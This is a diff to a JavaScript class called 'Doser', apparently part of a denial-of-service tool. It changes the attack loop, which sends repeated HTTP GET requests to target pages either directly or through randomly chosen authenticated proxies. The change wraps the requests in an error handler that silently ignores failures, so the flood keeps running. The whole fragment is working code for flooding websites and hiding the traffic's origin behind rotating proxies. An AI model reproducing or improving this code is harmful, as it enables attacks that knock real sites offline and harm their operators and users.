@@ -95,28 +95,31 @@ export class Doser {
 
       for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
         this.eventSource.emit('atack', { type: 'atack', url: target.site.page })
-        if (directRequest) {
-          await axios.get(target.site.page, { timeout: 5000 })
-        } else {
-          const proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
-          const proxyAddressSplit = proxy.ip.split(':')
-          const proxyIP = proxyAddressSplit[0]
-          const proxyPort = parseInt(proxyAddressSplit[1])
-          const proxyAuthSplit = proxy.auth.split(':')
-          const proxyUsername = proxyAuthSplit[0]
-          const proxyPassword = proxyAuthSplit[1]
+        try {
+          if (directRequest) {
+            await axios.get(target.site.page, { timeout: 5000 })
+          } else {
+            const proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
+            const proxyAddressSplit = proxy.ip.split(':')
+            const proxyIP = proxyAddressSplit[0]
+            const proxyPort = parseInt(proxyAddressSplit[1])
+            const proxyAuthSplit = proxy.auth.split(':')
+            const proxyUsername = proxyAuthSplit[0]
+            const proxyPassword = proxyAuthSplit[1]
 
-          await axios.get(target.site.page, {
-            timeout: 5000,
-            proxy: {
-              host: proxyIP,
-              port: proxyPort,
-              auth: {
-                username: proxyUsername,
-                password: proxyPassword
+            await axios.get(target.site.page, {
+              timeout: 5000,
+              proxy: {
+                host: proxyIP,
+                port: proxyPort,
+                auth: {
+                  username: proxyUsername,
+                  password: proxyPassword
+                }
               }
-            }
-          })
+            })
+          }
+        } catch (e) {
         }
       }
     }
